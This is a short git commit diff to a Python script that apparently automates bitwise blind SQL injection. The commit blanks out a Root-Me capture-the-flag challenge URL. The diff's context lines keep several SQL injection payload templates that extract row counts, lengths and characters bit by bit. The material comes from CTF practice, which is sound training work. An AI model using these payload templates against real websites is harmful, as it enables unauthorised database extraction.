bcb20d7b8986bf8251149beb8401fb5f3852b775
WinterMute1000 <42152852+WinterMute1000@users.noreply.github.com>
2021-12-22 14:21:21 +0900

    delete dummy

--- bitwise_public.py
+++ bitwise_public.py
@@ -6,7 +6,7 @@ DATA_COUNT_SHIFT_QUERY = ' and (select substr(lpad(bin(count({0})>>{1}),8,0),8,1
 DATA_LENGTH_SHIFT_QUERY = ' and (select substr(lpad(bin(length({0})>>{1}),8,0),8,1)=1)'
 DATA_BIT_SHIFT_QUERY = ' and (select substr(lpad(bin(ascii(substr({0},{1},1))>>{2}),8,0),8,1)=1 LIMIT {3}, 1)'
 # Insert target url
-TARGET_URL = 'http://challenge01.root-me.org/web-serveur/ch18/?action=news&news_id=3'
+TARGET_URL = ''
 # insert your table name
 TABLE_NAME = ''
 
